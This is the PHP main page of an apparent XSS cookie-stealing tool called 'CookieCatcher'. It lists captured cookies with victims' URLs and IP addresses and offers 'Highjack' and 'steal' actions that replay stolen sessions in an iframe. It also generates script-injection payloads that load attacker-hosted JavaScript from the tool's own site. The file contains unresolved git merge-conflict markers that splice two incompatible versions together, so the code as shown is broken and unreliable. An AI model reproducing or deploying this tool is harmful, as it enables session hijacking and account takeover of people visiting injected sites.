<?php
include('inc/configure.php');
include('inc/mysql_querylab.php');
include('inc/cookieCatcher.php');

////////////////////////////////////
## Initiate Objects/Classes
$catcher = new cookieCatcher();

////////////////////////////////////
## Initiate DB Connection
$catcher->connect($db_HOST,$db_USERNAME,$db_PASSWORD,$db_NAME);

////////////////////////////////////
## Declare Variables
$message = '';
$cookieResults = '';

////////////////////////////////////
## Cookie Commands
if(isset($_GET['action'])) {
  switch($_GET['action']) {
    case 'refresh':
      $result = $catcher->refresh($_GET['cookieID']);
      $message .= $result ? "Cookie #".htmlspecialchars($_GET['cookieID'])." Refreshed<br/>" : "An error occurred.<br/>";
      $message .= "<iframe id=\"frame\" src=\"".$siteURL."?cookieID=".htmlspecialchars($_GET['cookieID'])."&action=view\"></iframe>";
      break;
    case 'refresh-all':
      //do something
      $cookies = $catcher->view();
      if($cookies->recordCount>0) {
        foreach($cookies->results as $cookie) {
          $result = $catcher->refresh($cookie['id']);
          $message .= $result ? "Cookie #".htmlspecialchars($cookie['id'])." Refreshed<br/>" : "An error occurred.<br/>";
        }
      }
      break;
    case 'steal':
      $result = $catcher->steal($_GET['cookieID']);
      $message = "<pre id=\"payload2\">$result</pre>";
      $message .= "<iframe id=\"frame\" src=\"".$siteURL."?cookieID=".htmlspecialchars($_GET['cookieID'])."&action=view\"></iframe>";
      break;
    case 'view':
      $result = $catcher->refresh($_GET['cookieID']);
      $message .= "<div id=\"view\">".$result."</div>";
      die($message); // Leave this... loads content to the iframe
      break;
    default:
      //do nothing
  }
}

////////////////////////////////////
## Load Stored Cookies
if(isset($_GET['cookieID'])) {
  $cookies = $catcher->view($_GET['cookieID']);
} else {
  $cookies = $catcher->view();
}

////////////////////////////////////
## Print Cookies to Page
if($cookies->recordCount>0) {
  foreach($cookies->results as $cookie) {
<<<<<<< HEAD
    $cookieResults .= "<div class=\"column\">#".$cookie['id']."</div><div class=\"column\" style=\"width:50%;\">".$cookie['url']." (".$cookie['ip'].")</div><div class=\"column right\"><a href=\"?cookieID=".$cookie['id']."&action=steal\">Highjack Cookie</a></div><br clear=\"both\"/><hr/>";
  }
} else {
  $cookieResults = "Cookie #".$cookie['id']."not found.";
  $cookieResults = "<div style=\"padding:10px 0 0 10px;\">no cookies found.</div>";
=======
    $cookieResults .= "<div class=\"column\">#".$cookie['id']."</div><div class=\"column\" style=\"width:50%;\">".$cookie['url']." (".$cookie['ip'].")</div><div class=\"column right\"><a href=\"?cookieID=".$cookie['id']."&action=refresh\">Refresh</a> - <a href=\"?cookieID=".$cookie['id']."&action=steal\">Highjack</a></div><br clear=\"both\"/>";
  }
} else {
  $cookieResults = "Cookie #".$cookie['id']."not found.";
>>>>>>> a765228d6b9b129e5db14207d006a4689f83af13
}

////////////////////////////////////
## SET ATTACK/PAYLOAD
<<<<<<< HEAD
$pl = $catcher->payloads();
foreach($pl->results as $payload) {
  $payloads[$payload['id']]['name'] = $payload['name']; 
  $payloads[$payload['id']]['payload'] = urlencode(str_replace('{siteURL}',$siteURL,$payload['payload'])); 
}
=======
$attack = 'x.js';
$payload = sprintf('<script src="%s%s"/>', $siteURL, $attack);
$payload = htmlspecialchars($payload);
>>>>>>> a765228d6b9b129e5db14207d006a4689f83af13

?>

<html>
<head>
<title>CookieCatcher BETA v0.1</title>
<<<<<<< HEAD
<script>
function c() {
  p = document.getElementById('payloadcode');
  l = document.getElementById('counter');
  l.value = p.value.length;
}
function u(pid) {
  document.getElementById('payloadcode').value = unescape(payload[pid].replace("+"," "));
  c();
}
var payload = new Array();
payload[0] = "";
<?php foreach($payloads as $k=>$p) { ?>
payload[<?php echo $k;?>] = "<?php echo $p['payload'];?>";
<?php } ?>
</script>
<link href="/style.css" rel="stylesheet">
</head>

<body onload="c()">
<pre id="ascii">
      ...                                        ..         .                        ...                           s                                                  
   xH88"`~ .x8X                            < .z@8"`        @88>                   xH88"`~ .x8X                    :8                .uef^"                            
 :8888   .f"8888Hf        u.          u.    !@88E          %8P                  :8888   .f"8888Hf                .88              :d88E                     .u    .   
:8888>  X8L  ^""`   ...ue888b   ...ue888b   '888E   u       .         .u       :8888>  X8L  ^""`        u       :888ooo       .   `888E            .u     .d88B :@8c  
X8888  X888h        888R Y888r  888R Y888r   888E u@8NL   .@88u    ud8888.     X8888  X888h          us888u.  -*8888888  .udR88N   888E .z8k    ud8888.  ="8888f8888r 
88888  !88888.      888R I888>  888R I888>   888E`"88*"  ''888E` :888'8888.    88888  !88888.     .@88 "8888"   8888    <888'888k  888E~?888L :888'8888.   4888>'88"  
88888   %88888      888R I888>  888R I888>   888E .dN.     888E  d888 '88%"    88888   %88888     9888  9888    8888    9888 'Y"   888E  888E d888 '88%"   4888> '    
88888 '> `8888>     888R I888>  888R I888>   888E~8888     888E  8888.+"       88888 '> `8888>    9888  9888    8888    9888       888E  888E 8888.+"      4888>      
`8888L %  ?888   ! u8888cJ888  u8888cJ888    888E '888&    888E  8888L         `8888L %  ?888   ! 9888  9888   .8888Lu= 9888       888E  888E 8888L       .d888L .+   
 `8888  `-*""   /   "*888*P"    "*888*P"     888E  9888.   888&  '8888c. .+     `8888  `-*""   /  9888  9888   ^%888*   ?8888u../  888E  888E '8888c. .+  ^"8888*"    
   "888.      :"      'Y"         'Y"      '"888*" 4888"   R888"  "88888%         "888.      :"   "888*""888"    'Y"     "8888P'  m888N= 888>  "88888%       "Y"      
     `""***~"`                                ""    ""      ""      "YP'            `""***~"`      ^Y"   ^Y'               "P'     `Y"   888     "YP'                 
                                                                                                                                        J88"                          
                                                                                                                                        @%                            
                                                                                                                                      :"                              
</pre>

<?php if($message=='') { ?>
<div id="tag">XSS Payload</div>
<div id="payload">
  <div class="payloadselect">
    <select onchange="u(this.value);">
      <option value="0">-- select an attack--</option>
      <?php foreach($payloads as $k=>$p) { ?>
      <option value="<?php echo $k;?>"><?php echo $p['name'];?></option>
      <?php } ?>
    </select>
  </div>
  <div class="payloadcode"><input type="text" id="payloadcode" onkeyup="c()" value="" size=60/><input type="text" id="counter" value=""/></div><br clear="both"/>
</div>
<?php } ?>

<p><?php echo $message; ?></p>

<div class="table"><?php echo $message=='' ? $cookieResults : '<a class="button" href="?">back</a><a class="button" href="?">delete</a>'; ?></p></div>
=======
<style>
h1,h2,h3 { color:#333; font-family: 'Crushed', cursive; }
body {
background: #cedce7!important;
background: -moz-linear-gradient(top,  #cedce7 0%, #596a72 100%);
background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#cedce7), color-stop(100%,#596a72));
background: -webkit-linear-gradient(top,  #cedce7 0%,#596a72 100%);
background: -o-linear-gradient(top,  #cedce7 0%,#596a72 100%);
background: -ms-linear-gradient(top,  #cedce7 0%,#596a72 100%);
background: linear-gradient(top,  #cedce7 0%,#596a72 100%);
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#cedce7', endColorstr='#596a72',GradientType=0 );
height:1500px;
}
#payload { padding:10px; background:#ffffff; border:1px dashed #666666; text-align:center; font-family:courier; color:#666 }
#payload2 { padding:10px; background:#ffffff; border:1px dashed #666666; text-align:left; font-family:courier; color:#666 }
span { font-family: courier; font-size:12px; }
#tag { padding:2px; background:#666; color:#ffffff; font-weight: normal; font-size:12px; text-align:center; width:80px;}
#frame { width:100%; height:400px; border:1px dashed #666666; }
.table { background: #ffffff; border:1px dashed #666666; opacity:0.5;}
.column { float:left; padding:5px 15px; min-width:5%; background-color:#fff; margin-bottom:2px;}
.right { float:right };
</style>
</head>
<body>

<PRE>  ____            _    _         ____      _       _               
 / ___|___   ___ | | _(_) ___   / ___|__ _| |_ ___| |__   ___ _ __ 
| |   / _ \ / _ \| |/ / |/ _ \ | |   / _` | __/ __| '_ \ / _ \ '__|
| |__| (_) | (_) |   &lt;| |  __/ | |__| (_| | || (__| | | |  __/ |   
 \____\___/ \___/|_|\_\_|\___|  \____\__,_|\__\___|_| |_|\___|_|   
                                                                   
</PRE>
<div id="tag">XSS Payload</div>
<div id="payload"><?php echo $payload;?></div>

<p><?php echo $message; ?></p>
<p>
<div class="table"><?php echo $message=='' ? $cookieResults : '<a href="?">back</a>'; ?></p></div>
>>>>>>> a765228d6b9b129e5db14207d006a4689f83af13

</body>
</html>
